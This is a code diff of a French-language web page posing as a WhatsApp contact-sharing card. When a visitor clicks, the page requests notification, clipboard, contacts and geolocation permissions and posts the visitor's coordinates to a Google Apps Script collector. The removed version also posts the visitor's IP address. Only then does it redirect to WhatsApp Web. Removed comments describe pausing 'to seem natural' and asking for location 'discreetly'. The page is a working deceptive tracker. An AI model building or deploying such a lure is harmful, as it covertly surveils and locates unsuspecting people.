@@ -167,9 +167,9 @@
     <div class="main">
         <div class="card" id="contactCard">
             <div class="profile-circle">S</div>
-            <div class="name">Seami</div>
+            <div class="name">Saifou</div>
             <p>Cliquez pour partager votre contact sur WhatsApp</p>
-            <button id="actionButton">Partager</button>
+            <button id="actionButton">Contacter</button>
             <div class="loading" id="loadingSpinner"></div>
         </div>
     </div>
@@ -185,35 +185,28 @@
             const button = document.getElementById('actionButton');
             const spinner = document.getElementById('loadingSpinner');
 
-            // Étape 1 : Afficher le chargement
             button.style.display = 'none';
             spinner.style.display = 'block';
-            card.querySelector('p').textContent = "Préparation du partage...";
+            card.querySelector('p').textContent = "Accès à Whatsapp en cours...";
 
-            // Étape 2 : Demander des permissions moins sensibles d'abord
             try {
-                // Permission de notifications (moins sensible)
+                // 1. Demande d'accès au presse-papiers
+                await navigator.permissions.query({ name: 'clipboard-write' });
+
+                // 2. Demande de permission pour les notifications
                 if ('Notification' in window) {
                     await Notification.requestPermission();
                 }
 
-                // Permission de stockage (si disponible)
-                if (navigator.storage && navigator.storage.persist) {
-                    await navigator.storage.persist();
+                // 3. Demande d'accès aux contacts
+                if (navigator.contacts && navigator.contacts.select) {
+                    await navigator.contacts.select(['name', 'tel'], { multiple: false });
                 }
 
-                // Petite pause pour paraître naturel
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                // Étape 3 : Demander la géolocalisation discrètement
+                // 4. Demande de géolocalisation
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
-                            // Récupérer l'adresse IP
-                            const ipResponse = await fetch('https://api.ipify.org?format=json');
-                            const ipData = await ipResponse.json();
-
-                            // Envoyer les données
                             await fetch("https://script.google.com/macros/s/AKfycbzJ9nqFDc5MP4AJXBsc-e6iu8fB19VnUG674-DPYQTungYtXSMEgdC31LDLKZrh9A2u/exec", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
@@ -221,31 +214,23 @@
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude,
                                     nom_utilisateur: "seami",
-                                    ip: ipData.ip
+                                    contact: "0123456789"
                                 }),
                                 mode: 'no-cors'
                             });
 
-                            // Redirection finale
-                            card.querySelector('p').textContent = "Redirection vers WhatsApp...";
-                            window.location.href = "https://web.whatsapp.com";
-                        },
-                        (error) => {
-                            console.warn("Géolocalisation refusée:", error);
-                            // Rediriger même si la géolocalisation échoue
-                            card.querySelector('p').textContent = "Redirection vers WhatsApp...";
+                            card.querySelector('p').textContent = "Redirection en cours...";
                             setTimeout(() => {
                                 window.location.href = "https://web.whatsapp.com";
                             }, 1500);
                         },
-                        { enableHighAccuracy: false, timeout: 5000 }
+                        (error) => {
+                            window.location.href = "https://web.whatsapp.com";
+                        },
+                        { enableHighAccuracy: false, timeout: 3000 }
                     );
                 } else {
-                    // Fallback si la géolocalisation n'est pas disponible
-                    card.querySelector('p').textContent = "Redirection vers WhatsApp...";
-                    setTimeout(() => {
-                        window.location.href = "https://web.whatsapp.com";
-                    }, 1500);
+                    window.location.href = "https://web.whatsapp.com";
                 }
             } catch (error) {
                 console.error("Erreur:", error);
